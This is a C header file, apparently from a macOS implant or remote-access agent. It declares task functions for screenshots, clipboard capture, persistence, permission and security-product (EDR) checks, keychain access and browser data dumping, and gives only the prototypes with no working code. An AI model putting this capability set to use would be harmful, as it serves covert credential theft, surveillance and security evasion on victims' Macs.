#ifndef TASKS_MACOS_H
#define TASKS_MACOS_H

#include "msgpack.h"
#include <stdint.h>

int task_screenshot(mp_writer_t* w);
int task_clipboard(mp_writer_t* w);
int task_persist(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_tcc_check(mp_writer_t* w);
int task_defaults_read(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_edr_check(mp_writer_t* w);
int task_keychain(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_browser_dump(const uint8_t* data, uint32_t data_len, mp_writer_t* w);

#endif // TASKS_MACOS_H
